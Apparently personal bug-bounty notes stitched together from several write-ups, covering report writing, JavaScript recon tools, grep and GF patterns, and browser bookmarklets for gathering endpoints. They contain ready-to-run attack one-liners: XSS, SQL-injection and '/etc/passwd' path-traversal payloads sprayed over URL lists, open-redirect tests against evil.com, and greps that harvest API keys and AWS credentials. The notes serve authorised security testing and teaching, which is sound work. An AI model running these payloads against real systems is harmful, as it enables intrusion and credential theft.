Use of Hard-coded Cryptographic Key(CWE-321)  
Use of Hard-coded Password(CWE-259)  
Use of Inherently Dangerous Function(CWE-242)  
Use of Insufficiently Random Values(CWE-330)  
User Interface (UI) Misrepresentation of Critical Information(CWE-451)  
Violation of Secure Design Principles(CWE-657)  
Weak Cryptography for Passwords(CWE-261)  
Weak Password Recovery Mechanism for Forgotten Password(CWE-640)  
Wrap-around Error(CWE-128)  
Write-what-where Condition(CWE-123)  
XML Entity Expansion(CWE-776)  
XML External Entities (XXE)(CWE-611)  
XML Injection(CWE-91)  
XSS Using MIME Type Mismatch(CAPEC-209)  
LLM01: Prompt Injection  
LLM02: Insecure Output Handling  
LLM03: Training Data Poisoning  
LLM04: Model Denial of Service  
LLM05: Supply Chain Vulnerabilities  
LLM06: Sensitive Information Disclosure  
LLM07: Insecure Plugin Design  
LLM08: Excessive Agency  
LLM09: Overreliance  
LLM10: Model Theft
```

## 3Ô∏è‚É£ Severity

- We have 3 options

![](https://miro.medium.com/v2/resize:fit:875/1*K6Q4WZrZeciAGlds8n1dSA.png)

Companies are more likely to accept your report if you submit it by following the CVSS Severity Method.

_üõ°Ô∏èLearn how to calculate the right CVSS metrics_

```
https://www.secopsolution.com/blog/understanding-cvss-base-score-calculator
```

## 4Ô∏è‚É£ Proof of Concept

Sections included are:

_Title_

- For example- RXSS on sub.redacted.com via `title` parameter.

_Description_

- You don‚Äôt always need to include a 2‚Äì3 paragraph explanation about the bug itself. The key factor is whether it is easily understandable and can be reproduced by the triager.

_Impact_

- ==The entire report is equivalent to trash== üóëÔ∏è if it cannot demonstrate how a real malicious attacker might exploit that bug.

## 5Ô∏è‚É£ Must include thingsüñãÔ∏è

![](https://miro.medium.com/v2/resize:fit:875/1*g9MGJkwOJT1eT09hz-nf5w.png)

- It is very important that you create a video recording demonstrating the bug as proof of concept (POC) along with the exact date and time. Let me explain why this is crucial: sometimes you report a reflected cross-site scripting (RXSS) vulnerability that is valid and reproducible. However, when the triager attempts to reproduce it, the company might have implemented a Web Application Firewall (WAF) that prevents the payload from reaching the application directly. As a result, the triager may dismiss it as a false positive and mark it as not applicable (NA). This decision can negatively impact your reputation and create difficulties, especially for beginners like you



```javascript
# if you find something by gf tool:

Tool-install-(https://github.com/tomnomnom/gf)
cat allurls.txt | gf or | sed 's/=.*/=/' | sort -u > open_redirect.txt

cat allurls.txt | gf lfi | sed 's/=.*/=/' | sort -u > lfi_output.txt

# try exploting:

nuclei -list lfi_output.txt -tags lfi -o lfi_scan_results.txt

nuclei -list open_redirects.txt -tags open-redirect -o open_redirect_scan_results.txt

or

nuclei -list open_redirects.txt -tags open-redirect -o open_redirect_scan_results.txt

payload lfi: 

wget https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt  


```

## JS Recon

To use?

**FAKJS** is a super fast **#go** tool that finds different sensitive data in JavaScript files, including:

![[Pasted image 20250622151833.png]]

- API keys, tokens, etc.
    
- Internal or hidden endpoints
    
- Configuration data
    
- Potential indicators of exposed logic or backend connections

> https://github.com/thd3r/fakjs

#js

üåê ùôÖùôñùô´ùôñùôéùôòùôßùôûùô•ùô© ùôÄùô£ùô™ùô¢ùôöùôßùôñùô©ùôûùô§ùô£ ùôÅùô§ùôß ùòΩùô™ùôú ùòΩùô§ùô™ùô£ùô©ùôÆ ùôÉùô™ùô£ùô©ùôöùôßùô®! üöÄ

üîç Find JS Files, Extract API Keys, Secrets, Endpoints & More‚Ä¶

üí° ùó™ùóµùòÜ ùóùùóÆùòÉùóÆùó¶ùó∞ùóøùó∂ùóΩùòÅ ùóòùóªùòÇùó∫ùó≤ùóøùóÆùòÅùó∂ùóºùóª?
JavaScript files often contain juicy stuff ‚Äî API keys, hidden endpoints, internal routes, and more. Smart recon = fast p1/p2 finds. Save this full recon pipeline and automate your success. üëá

üîß ùüèÔ∏è. ùóîùòÇùòÅùóºùó∫ùóÆùòÅùó≤ùó± ùóùùó¶ ùóôùó∂ùóπùó≤ ùóôùó∂ùóªùó±ùó∂ùóªùó¥ (CLI Tools)

```js
üìç Using gau
ùöêùöäùöû ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ | ùöêùöõùöéùöô ".ùöìùöú" | ùöùùöéùöé ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù

üìç Wayback Machine
ùö†ùöäùö¢ùöãùöäùöåùöîùöûùöõùöïùöú ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ | ùöêùöõùöéùöô ".ùöìùöú" | ùöùùöéùöé ùöìùöú_ùö†ùöäùö¢ùöãùöäùöåùöî.ùöùùö°ùöù

üìç Katana fast crawler
ùöîùöäùöùùöäùöóùöä -ùöû ùöëùöùùöùùöôùöú://ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ -ùöìùöå -ùöúùöíùöïùöéùöóùöù | ùöùùöéùöé ùöìùöú_ùöîùöäùöùùöäùöóùöä.ùöùùö°ùöù

üìç Combining sources
ùöéùöåùöëùöò ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ | ùöúùöûùöãùöèùöíùöóùöçùöéùöõ | ùöëùöùùöùùöôùö° -ùöúùöíùöïùöéùöóùöù | ùöêùöäùöû | ùöêùöõùöéùöô ".ùöìùöú" | ùöäùöóùöéùö† ùöäùöïùöï_ùöìùöú.ùöùùö°ùöù

üìç Extract from robots.txt
ùöåùöûùöõùöï -ùöú ùöëùöùùöùùöôùöú://ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ/ùöõùöòùöãùöòùöùùöú.ùöùùö°ùöù | ùöêùöõùöéùöô ".ùöìùöú" | ùöäùö†ùöî '{ùöôùöõùöíùöóùöù $ùôΩùôµ}' | ùöùùöéùöé ùöìùöú_ùöõùöòùöãùöòùöùùöú.ùöùùö°ùöù
```

üîé ùó†ùóÆùóªùòÇùóÆùóπ ùó†ùó≤ùòÅùóµùóºùó±ùòÄ

‚úîÔ∏è Ctrl + U ‚Üí View Page Source
‚úîÔ∏è F12 ‚Üí Network Tab ‚Üí Filter .js
‚úîÔ∏è Burp Suite Spider or Crawler

üì§ ùüêÔ∏è. ùóòùòÖùòÅùóøùóÆùó∞ùòÅ ùóòùóªùó±ùóΩùóºùó∂ùóªùòÅùòÄ & ùóîùó£ùóú ùóûùó≤ùòÜùòÄ

```js
üîç LinkFinder
ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùö°ùöäùöõùöêùöú -ùô∏{} ùöôùö¢ùöùùöëùöòùöó3 ~/ùöùùöòùöòùöïùöú/ùôªùöíùöóùöîùôµùöíùöóùöçùöéùöõ/ùöïùöíùöóùöîùöèùöíùöóùöçùöéùöõ.ùöôùö¢ -ùöí {} -ùöò ùöåùöïùöí | ùöùùöéùöé ùöéùöóùöçùöôùöòùöíùöóùöùùöú.ùöùùö°ùöù

üîê SecretFinder
ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùö°ùöäùöõùöêùöú -ùô∏{} ùöôùö¢ùöùùöëùöòùöó3 ~/ùöùùöòùöòùöïùöú/ùöÇùöéùöåùöõùöéùöùùôµùöíùöóùöçùöéùöõ/ùöÇùöéùöåùöõùöéùöùùôµùöíùöóùöçùöéùöõ.ùöôùö¢ -ùöí {} -ùöò ùöåùöïùöí | ùöùùöéùöé ùöúùöéùöåùöõùöéùöùùöú.ùöùùö°ùöù

üéØ gf patterns
ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùöêùöè ùöäùöôùöíùöîùöéùö¢ùöú | ùöùùöéùöé ùöäùöôùöí_ùöîùöéùö¢ùöú.ùöùùö°ùöù
ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùöêùöè ùöäùö†ùöú-ùöîùöéùö¢ùöú | ùöùùöéùöé ùöäùö†ùöú_ùöîùöéùö¢ùöú.ùöùùö°ùöù
ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùöêùöè ùöìùöúùöòùöó | ùöùùöéùöé ùöìùöúùöòùöó_ùöïùöéùöäùöîùöú.ùöùùö°ùöù
ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùöêùöè ùöûùöõùöïùöú | ùöùùöéùöé ùöûùöõùöïùöú.ùöùùö°ùöù

üß† Grep secrets manually
ùöêùöõùöéùöô -ùô¥ -ùöò "(ùöäùöôùöíùô∫ùöéùö¢|ùöäùöûùöùùöëùöÉùöòùöîùöéùöó|ùöåùöïùöíùöéùöóùöù_ùöúùöéùöåùöõùöéùöù|ùöäùöåùöåùöéùöúùöúùöÉùöòùöîùöéùöó)["'= ]+[^"' ]+" ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùöùùöéùöé ùöèùöòùöûùöóùöç_ùöîùöéùö¢ùöú.ùöùùö°ùöù
```

üîÅ ùüØ. ùóñùóµùóÆùó∂ùóª ùóßùóºùóºùóπùòÄ ùóßùóºùó¥ùó≤ùòÅùóµùó≤ùóø

```js
üéØ Find JS + Endpoints
ùöêùöäùöû ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ | ùöêùöõùöéùöô ".ùöìùöú" | ùöùùöéùöé ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù && ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùö°ùöäùöõùöêùöú -ùô∏{} ùöôùö¢ùöùùöëùöòùöó3 ~/ùöïùöíùöóùöîùöèùöíùöóùöçùöéùöõ.ùöôùö¢ -ùöí {} -ùöò ùöåùöïùöí | ùöùùöéùöé ùöéùöóùöçùöôùöòùöíùöóùöùùöú.ùöùùö°ùöù

üîë Find JS + API keys
ùöêùöäùöû ùöùùöäùöõùöêùöéùöù.ùöåùöòùöñ | ùöêùöõùöéùöô ".ùöìùöú" | ùöäùöóùöéùö† ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù && ùöåùöäùöù ùöìùöú_ùöèùöíùöïùöéùöú.ùöùùö°ùöù | ùöêùöè ùöäùöôùöíùöîùöéùö¢ùöú | ùöùùöéùöé ùöäùöôùöí_ùöîùöéùö¢ùöú.ùöùùö°ùöù
```


```bash
katana -u https://example.com -js -o js_files.txt
```

```css
python3 LinkFinder.py -i js_files.txt -o endpoints.html
```

**Tool 2: GoLinkFinder (Faster Alternative)**

I switched to **GoLinkFinder** for larger apps, which processes files **10x faster**.

```lua
golinkfinder -file js_files.txt -output results.json
```

**What did I find?**

- **/API/admin/users** (Unauthorized Access)
- **/internal/config** (Exposed AWS Keys)
- **/v1/tokens** (Leaking JWT Secrets)

```php
fetch("/api/v1/config", {  
  headers: {  
    "Authorization": "Bearer dev_environment_skip_validation"  
  }  
})  
```

- **Full database credentials** were exposed.
- **Payment gateway keys** were hard coded.
- **Admin privileges** were granted without checks.

I reported it immediately. **30 minutes later, the bounty was confirm**ed.

Bonus tip: 

```bash
nuclei -u https://example.com -t exposures/  
```

## Bonus Tool:

**MapperPlus** facilitates the extraction of source code from a collection of targets which have publicly exposed .js files:

![[Pasted image 20250702121751.png]]

> https://github.com/midoxnet/mapperplus

---
## Grep tips for Javascript Analysis

```bash
üü£Extracting JavaScript Files from recursive Directories
find /path/to/your/folders -name "*.js" -exec mv {} /path/to/target/folder/ \;

üü£Searching for API Keys and Secrets
cat * | grep -rE "apikey|api_key|secret|token|password|auth|key|pass|user"

üü£Detecting Dangerous Function Calls
cat * | grep -rE "eval|document\.write|innerHTML|setTimeout|setInterval|Function"

üü£Checking for URL Manipulation
cat * | grep -rE "location\.href|location\.replace|location\.assign|window\.open"

üü£Searching for Cross-Origin Requests
cat * | grep -rE "XMLHttpRequest|fetch|Access-Control-Allow-Origin|withCredentials" /path/to/js/files

üü£Analyzing postMessage Usage
cat * | grep -r "postMessage"

üü£Finding Hardcoded URLs or Endpoints
cat * | grep -rE "https?://|www\."

üü£Locating Debugging Information
cat * | grep -rE "console\.log|debugger|alert|console\.dir"

üü£Investigating User Input Handling
cat * | grep -rE "document\.getElementById|document\.getElementsByClassName|document\.querySelector|document\.forms"
```

---
#### Sensitive Data Exposure: The $8,427 Mistake

One endpoint stood out:

source: https://infosecwriteups.com/50-200-low-hanging-bugs-fruit-automation-bug-automation-part-1-e9711cf7e042

### $50‚Äì$200 Low Hanging Bugs/Fruit Automation For JS

# Why Grep and GF-Patterns?

Manual code/endpoint analysis is time-consuming. **Grep** (Global Regular Expression Print) and **GF** (a tool by @tomnomnom that wraps grep with vulnerability-specific patterns) automate the hunt for low-hanging fruit. They excel at:

- Rapidly sifting through massive codebases, logs, or URL lists.
- Identifying high-risk patterns (e.g., hardcoded secrets, SSRF parameters).
- Prioritizing targets for deeper exploitation.

# Grep Extensions: Flags That Unlock Precision

Grep‚Äôs power lies in its flags. Here‚Äôs how to weaponize them:


# Essential Flags for Bug Bounties

1. `**-i**`: Case-insensitive search (e.g., `api_key` vs `API_KEY`).
2. `**-r**`: Recursive directory search.
3. `**-E**`: Enable extended regex (supports `|`, `+`, `{}`).
4. `**-n**`: Show line numbers (critical for reporting).
5. `**-o**`: Print only matched text (ideal for piping to other tools).
6. `**-v**`: Invert match (exclude noise like `example.com`).
7. `**--include**`**/**`**--exclude**`: Target specific file types (e.g., `--include=*.js`).

# Key Assets to Target with Grep/GF

## 1. JavaScript Files

**Why**: JS files leak API keys, endpoints, and debug parameters.  
**Where to Find**:

- `/static/js/`, `/assets/`, `/dist/` directories
- URLs ending with `.js` (e.g., `[https://example.com/app.min.js](https://example.com/app.min.js\))`

**Commands**:

```bash
# Find API keys in JS files:    
grep -riE 'api_?key|token|secret' /path/to/downloaded/js/files/ --include=*.js    
  
# Find debug flags (like 'debug=true' in code logic):    
grep -ri -C 3 'debug=true' /path/to/js/files/    
  
# Use GF to hunt for endpoints:    
cat example_js_files.txt | gf endpoints | httpx -silent
```

![](https://miro.medium.com/v2/resize:fit:700/1*ETuC67dsIo6ZdZQYOy9Xqg.png)

## 2. Subdomains (e.g., `api.example.com`, `dev.example.com`)

**Why**: Subdomains often have weaker security controls.  
**How to Gather**:

- Use `subfinder`, `amass`, or `assetfinder` to enumerate subdomains.
- Fetch historical URLs with `waybackurls` or `gau`.

**Commands**:

```bash
# Grep for AWS keys across all subdomains' code:    
grep -riE 'AKIA[0-9A-Z]{16}' /path/to/subdomain/files/ --exclude-dir=.git    
  
# Find SSRF-prone parameters in subdomain URLs:    
cat subdomain_urls.txt | gf ssrf | httpx -silent -fr  
```

## 3. API Endpoints (e.g., `/api/v1/users`, `/graphql`)

**Why**: APIs are goldmines for IDOR, SQLi, and auth flaws.  
**Where to Find**:

- Burp Suite logs, `katana`/`gau` output, or `postman` collections.

**Commands**:

```bash
# Hunt for UUIDs in API responses (IDOR candidates):    
grep -riE '[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}' /api/logs/    
  
# GF + SQLi pattern testing:    
cat api_endpoints.txt | gf sqli | qsreplace "') OR 1=1--" | httpx -ms "database error"

```

#find_env_backups_with_nuclei
## 4. Configuration Files

**Why**: `.env`, `config.php`, and `*.yaml` files often contain secrets.  
**Where to Find**:

- Web root directories (`/var/www/`, `/app/config/`).
- Accidental public exposure (e.g., `[https://example.com/.env](https://example.com/.env\).)`[).](https://example.com/.env\).)

**Commands**:

```bash
# Hunt for database credentials:    
grep -riE 'DB_(USER|PASSWORD|HOST)=[^\n]+' /app/ --include=.env    
  
# Find cloud credentials in YAML files:    
grep -riE 'aws_access_key_id|s3_bucket' --include=*.yaml /config/
```

## 5. Open Redirect & SSRF Parameters

**Why**: Parameters like `?url=` or `?next=` are low-hanging fruit.  
**How to Find**:

- Extract URLs from source code, HAR files, or proxy logs.

**Commands**:

```bash
# GF for open redirects:    
cat urls.txt | gf redirect | qsreplace "https://evil.com" | httpx -fr -mr "evil.com"    
  
# Grep for URL parameters in source code:    
grep -ri 'window.location.href' /app/ --include=*.js  
```

**Final Tip**: Always exclude noisy directories for faster results:

```bash
grep -riE 'password' /app/ --exclude-dir={node_modules,.git,dist}  
```


#gf 
# GF-Patterns: The Art of Targeting Vulnerable Links

GF ([**github.com/tomnomnom/gf**](https://github.com/tomnomnom/gf)) pre-packages regex patterns for vulnerabilities like SSRF, SQLi, and IDOR.

## Top GF Patterns and Usage

## **SQL Injection**:

> cat urls.txt | gf sqli | httpx -silent  

Looks for parameters like `?id=1` or `&user=*`.

## **2. SSRF**:

> cat urls.txt | gf ssrf | tee ssrf_candidates.txt  

Targets `url=`, `callback=`, or `dest=` parameters.

## **3. XSS (Cross-Site Scripting)**

**Pattern**: Targets parameters like `?search=`, `q=`, or `name=`.  
**Command**:

```bash
cat urls.txt | gf xss | qsreplace '"><svg/onload=alert(1)>' | httpx -silent -ms 200  
```

**Why**:

- GF‚Äôs `xss` pattern filters URLs with reflection points (e.g., `?error=<input>`).
- `qsreplace` injects payloads while preserving URL structure.

## 4. LFI (Local File Inclusion)

#LFI

**Pattern**: Hunts for `file=`, `page=`, or `include=` parameters.  
**Command**:

```bash
cat urls.txt | gf lfi | qsreplace '../../../../etc/passwd' | httpx -sr -mr 'root:x:0'  
```

**Why**:

- GF‚Äôs `lfi` pattern identifies path traversal candidates.
- `-sr` (show response) and `-mr` (match regex) in `httpx` confirm file leaks.

**Pro Tip**:

- For Windows targets, test `..%5C..%5Cwindows%5Cwin.ini` (URL-encoded backslashes).

## 5. JWT Token Exposure

**Pattern**: Finds `Authorization: Bearer` headers or `token=` parameters.  
**Command**:

```bash
cat urls.txt | gf jwt | httpx -headers 'Cookie: debug=1' -sv | tee jwt_endpoints.txt  
```

**Why**:

- JWTs in URLs (e.g., `?token=eyJ...`) are often misconfigured.
- Add `-headers` to bypass weak auth checks during testing.

## 6. GraphQL Introspection (Bonus)

**Pattern**: Targets `/graphql` endpoints with introspection queries.  
**Command**:

```bash
cat urls.txt | gf graphql | httpx -path '/graphql?query={__schema{types{name}}}' -mr '__schema'  
```

**Why**:

- Introspection leaks API schemas, exposing hidden mutations/queries.
- Use `-path` in `httpx` to auto-append dangerous queries.

##  Secret Tip: Custom GF Patterns

Add your own patterns to `~/.gf/`. Example `ssrf.json`:

```bash
{    
  "flags": "-iE",    
  "pattern": "\\b(url|dest|redirect)=[^&]*"    
}  

```
# Vulnerable Links: From Grep to Exploitation

## Workflow

1. **Harvest URLs**: Use tools like `waybackurls`, `gau`, or `katana`. (Read my [URL Discovery](https://infosecwriteups.com/url-discovery-hunt-where-others-arent-hunting-recon-part-8-e0368b9aaf81) write-up)
2. **Filter with GF**:

```bash
cat urls.txt | gf xss | qsreplace '"><svg/onload=confirm(1)>' | httpx -mc 200  
```

1. **Contextual Grepping**:

- Search for `openRedirect` in JavaScript:

```bash
grep -riE 'window\.location|document\.location' --include=*.js  
```

Find insecure deserialization:

```bash
grep -ri 'ObjectInputStream' /app/  
```

# Mistakes to Avoid

- **Over-reliance**: Grep/GF output requires manual verification.
- **Regex Gaps**: Complex vulnerabilities (e.g., business logic) need human insight.
- **Noise**: Always exclude directories like `node_modules/` with `--exclude-dir`.

**Final Pro Tip**: Update GF-patterns weekly. The bug bounty landscape evolves fast ‚Äî so should your regex.

----

### 1. Identifying API Endpoints and Directories

JavaScript files frequently reference API endpoints and directories using relative or absolute paths. You can extract these by searching for patterns like:

```bash
"/api/v1/user/"
'/uploads/images/'
```

These directories might contain sensitive information or functionality that can be exploited further.

### 2. Finding Hidden Endpoints via Regex

To automate the process, use regex patterns to extract potential API endpoints and directories:

```bash
grep -Eo '("|\')(/[^"']+)("|\')' *.js | sort -u
```

This will list all directory references found in the JavaScript files.

### 3. Detecting GET Requests and Other HTTP Methods

GET requests are easy to spot in JavaScript as they are often directly written as:

```csharp
fetch("/api/v1/data")
axios.get("/user/profile")
```

However, POST, PUT, and DELETE requests may not be as obvious. Look for `fetch()` and `axios` methods with different HTTP verbs:

```php
fetch("/api/v1/update", { method: "POST" })
axios.post("/user/update", { data: userData })
```

Using regex:

```perl
grep -Eo 'fetch\([^)]*\)|axios\.[a-z]+' *.js | sort -u
```

### 4. Identifying API Keys and Secrets

Sometimes, API keys are hardcoded within JavaScript files. Look for patterns like:

```perl
grep -Eo '[A-Za-z0-9_-]{30,}' *.js | sort -u
```

You can also use automated tools like `SecretFinder` and `LinkFinder` to extract keys and endpoints.

### Automating JavaScript Analysis

To speed up the process, tools like the following can help:

- **LinkFinder**: Extracts endpoints from JavaScript files
- **SecretFinder**: Finds sensitive keys in JavaScript
- **Burp Suite**: Proxy tool to inspect JavaScript responses


#js

# Extract all Js File Urls From Any page:

![[Pasted image 20250624204414.png]]

```js
// üìå Bookmarklet: Collect all linked JavaScript files on a page
javascript:(function(){
    let urls = [];
    document.querySelectorAll('*').forEach(e => {
        urls.push(e.src, e.href, e.url);
    });
    urls = [...new Set(urls)]
        .filter(u => u && u.endsWith('.js'))
        .join('\n');
    let blob = new Blob([urls], {type: 'text/plain'});
    let a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'javascript_urls.txt';
    a.click();
})();

```

or use this:, created by¬†[Renniepak](https://bsky.app/profile/renniepak.nl):
```javascript
javascript:(function(){var scripts=document.getElementsByTagName("script"),regex=/(?<=(\"|\'|\`))\/[a-zA-Z0‚Äì9_?&=\/\-\#\.]*(?=(\"|\'|\`))/g;const results=new Set;for(var i=0;i<scripts.length;i++){var t=scripts[i].src;""!=t&&fetch(t).then(function(t){return t.text()}).then(function(t){var e=t.matchAll(regex);for(let r of e)results.add(r[0])}).catch(function(t){console.log("An error occurred: ",t)})}var pageContent=document.documentElement.outerHTML,matches=pageContent.matchAll(regex);for(const match of matches)results.add(match[0]);function writeResults(){results.forEach(function(t){document.write(t+"<br>")})}setTimeout(writeResults,3e3);})();
```

üîñFind hidden Endpoints:

```js
javascript:(async function(){let scanningDiv=document.createElement("div");scanningDiv.style.position="fixed",scanningDiv.style.bottom="0",scanningDiv.style.left="0",scanningDiv.style.width="100%",scanningDiv.style.maxHeight="50%",scanningDiv.style.overflowY="scroll",scanningDiv.style.backgroundColor="white",scanningDiv.style.color="black",scanningDiv.style.padding="10px",scanningDiv.style.zIndex="9999",scanningDiv.style.borderTop="2px solid black",scanningDiv.innerHTML="<h4>Scanning...</h4>",document.body.appendChild(scanningDiv);let e=[],t=new Set;async function n(e){try{const t=await fetch(e);return t.ok?await t.text():(console.error(`Failed to fetch ${e}: ${t.status}`),null)}catch(t){return console.error(`Error fetching ${e}:`,t),null}}function o(e){return(e.startsWith("/")||e.startsWith("./")||e.startsWith("../"))&&!e.includes(" ")&&!/[^\x20-\x7E]/.test(e)&&e.length>1&&e.length<200}function s(e){return[...e.matchAll(/['"]((?:\/|\.\.\/|\.\/)[^'"]+)['"]/g)].map(e=>e[1]).filter(o)}async function c(o){if(t.has(o))return;t.add(o),console.log(`Fetching and processing: ${o}`);const c=await n(o);if(c){const t=s(c);e.push(...t)}}const l=performance.getEntriesByType("resource").map(e=>e.name);console.log("Resources found:",l);for(const e of l)await c(e);const i=[...new Set(e)];console.log("Final list of unique paths:",i),console.log("All scanned resources:",Array.from(t)),scanningDiv.innerHTML=`<h4>Unique Paths Found:</h4><ul>${i.map(e=>`<li>${e}</li>`).join("")}</ul>`})();
```

![javascript bookmarklet result](https://www.yeswehack.com/_next/image?url=https%3A%2F%2Fcdn.sanity.io%2Fimages%2Fd51e1jt0%2Fproduction%2Fac795d82be13d38344c4d792ac3b5fcdefb66f6b-1035x1056.png&w=3840&q=75)

**üí° How to use:**

1. Create a **new bookmark** in your browser.
![[Pasted image 20250624211557.png]]

#### Manually Add or Edit a Bookmark (For Code/Bookmarklets)

- Press:
    
    ```
    Ctrl + Shift + O
    ```
    
    This opens the **Bookmarks Manager**.
    
- Find the folder (e.g., Bookmarks Bar) and click the **‚ãÆ three dots** next to a bookmark.
    
- Choose **Edit**:
    
    - **Name**: Any title you like
        
    - **URL**: Paste your `javascript:(function(){...})();` code or any link
        
- Click **Save**.
    
2. Paste the entire code above into the **URL field**.

![[Pasted image 20250624211409.png]]

**All in One Line BookMark Code:** (For the URL Section)

```js
javascript:(function(){let urls=[];document.querySelectorAll('*').forEach(e=>{urls.push(e.src,e.href,e.url);});urls=[...new Set(urls)].filter(u=>u&&u.endsWith('.js')).join('\n');let blob=new Blob([urls],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='javascript_urls.txt';a.click();})();
```

3. **Visit any target website and click the bookmark.**  

#### Show the Bookmarks Bar

Use the shortcut:

```bash
Ctrl + Shift + B
```
    
4. It will download a `javascript_urls.txt` file with all discovered `.js` links.
    

Perfect for feeding into tools like:

- LinkFinder
    
- SecretFinder
    
- JSParser
    
- Or doing manual analysis

> cat allurls.txt | grep -E "\.js$" >> js.txt

(https://github.com/m4ll0k/SecretFinder)
cd SecretFinder
python3 SecretFinder.py -i js.txt -o secret.txt

Tool-install-(https://github.com/projectdiscovery/nuclei)
> cat js.txt | nuclei -t /home/kali/nuclei-templates/http/exposures/ 

... add more?


## Basic JS recon

1. Use Subfinder to gather Subdomain on your target and save into a¬†file using following command

> subfinder -d redacted.com -o redact.txt  

2. Use httpx to sort out live domains from redact.txt into a new file

> httpx-toolkit -l  redact.txt -o livered.txt  

1. Use Katana For Crawling the¬†.js file endpoints and save them into a file by using¬†:

> katana -u livered.txt | grep ".js$" | tee redactjs  

2. Use Mantra by Piping the output of redactjs file to Mantra by using the following command¬†:

> cat redactjs | mantra  

The Following is the screenshot of my scan on the actual Target. I didn‚Äôt get any API Tokens but I got an easy way to find Sensitive info in js files.

![](https://miro.medium.com/v2/resize:fit:700/1*WzbU3xtV1CVE78pEAp4ZKg.png)

## Exstension:

### **21. EndPointer ‚Äî Find Sensitive URLs**

Extracts and analyzes URLs for potential security endpoints.

#### **Why It's Useful?**

- Helps locate sensitive web application endpoints.
- Useful for penetration testing and fuzzing.

> https://chromewebstore.google.com/detail/endpointer/ppliilneafplhagjhhphcjmjdmbjagcp

---


# ! AVOID GETTING PWNED BY BLINDLY RUNNING CODE

_follow the example:_

source from: https://freedium.cfd/https://medium.com/meetcyber/javascript-recon-for-bug-bounty-pentesting-3b22617007ec

Github Repo: https://github.com/KathanP19/JSFScan.sh

#### ‚úÖFEATURES

- Enumerate JS Links from various sources.
- Import file with many JS endpoint urls.
- Extract endpoints from JS Files
- Find Secrets
- Retrieve JS Files locally
- Generate a custom wordlist from JS Files
- Extract variable names to test for XSS with a wider attack surface.
- Auto scanning for DOM-based XSS
- Generate a structured and organized HTML report with all above mentioned features' output.

> _üé•_¬†YouTube Tutorial From the Tool Author

> https://www.youtube.com/watch?v=Z13dnarKF-w

#### üíæInstall Pre-requisites (GOlang)

```
wget -4 https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
tar -C /usr/local/ -xzf go1.24.1.linux-amd64.tar.gz
rm go1.24.1.linux-amd64.tar.gz
```

Open your configuration file using any text editor you like¬†`nano`¬†,¬†`vim`¬†,etc‚Ä¶

```bash
#for kali linux 
nano ~/.zshrc 

#for ubuntu 
nano ~/.bashrc
```

Add the following lines at the end of the¬†`.zshrc`¬†or¬†`.bashrc`¬†file.

(You can change the GOPATH accordingly based on your setup)

```bash
export GOPATH=/root/go-workspace
export GOROOT=/usr/local/go
PATH=$PATH:$GOROOT/bin/:$GOPATH/bin
```

Save the file and then update it using:

```bash
#kali linux
source ~/.zshrc

#ubuntu
source ~/.bashrc
```

```bash
git clone https://github.com/KathanP19/JSFScan.sh.git
```

![None](https://miro.medium.com/v2/resize:fit:700/1*NUlIR1y32vm0vB_zFT2c-g.png)

![None](https://miro.medium.com/v2/resize:fit:700/1*87CB0LMrUnl59IKaxPosxA.png)

Give it executable permission

```bash
chmod +x JSFScan.sh 
chmod +x install.sh`
```

Run the installation script

```bash
./install.sh
```

Now, before running anything script blindly, make a quick overview of what is written inside it for personal safety.

> üö®Always look for suspicious obfuscated strings, any dropper code, any downloading of tools apart from well-known bug bounty tools from github.com, or just the old school stupidity(sudo rm -rf).

> What happens is anyone can upload some harmful code on GitHub named as some well-known bug bounty tool and then include it in installation scripts of somewhere else.

![None](https://miro.medium.com/v2/resize:fit:700/1*x-oeea7QU8YXou-HR1fw7w.png)

For example, here, the LinkFinder is not from the official author repo but a forked version by¬†`dark-warlord14`¬†due to which, it's a good practice to add the original repo link instead, but it's your wish.

> Forked Version added as the source in the installation script

![None](https://miro.medium.com/v2/resize:fit:700/1*CJQi1U_7YDw5BDqMg5I5LA.png)

								Original link

>https://github.com/GerbenJavado/LinkFinder

![None](https://miro.medium.com/v2/resize:fit:700/1*KGgJFIFOv8MPBni1lb0jzw.png)

I come across this type of difference once in a while. Imagine the number of tools and scripts we ran blindly. We are already compromised by many unknown ways :)

![None](https://miro.medium.com/v2/resize:fit:700/1*V5360UJANM_OsMiWRP5GwA.png)

In some cases, just tiny differences, like instead of¬†`m4ll0k`¬†replace with¬†`m411Ok`¬†,¬†`m4110K`¬†etc, with your nasty code in it. [Pwning beginners in a massive wayü´†]

After the installation is over, head over to the¬†`help manual`

>./JSFScan.sh -h

Move the tool binaries to¬†`/usr/bin`

![None](https://miro.medium.com/v2/resize:fit:700/1*JMFlpmu9SUP2nMAGYGrQzg.png)

> sudo cp toolname /usr/bin/

Instead of¬†`gau`¬†, I prefer to use¬†`waymore`¬†instead.

So I changed¬†`gather_js`¬†to replace¬†`gau`with¬†`waymore`

`waymore`¬†takes a lot of time as it retrieves from many different sources.

![None](https://miro.medium.com/v2/resize:fit:700/1*frWKDvfPtJ-i4TM0luwGNQ.png)

Original¬†`gather_js()`¬†function

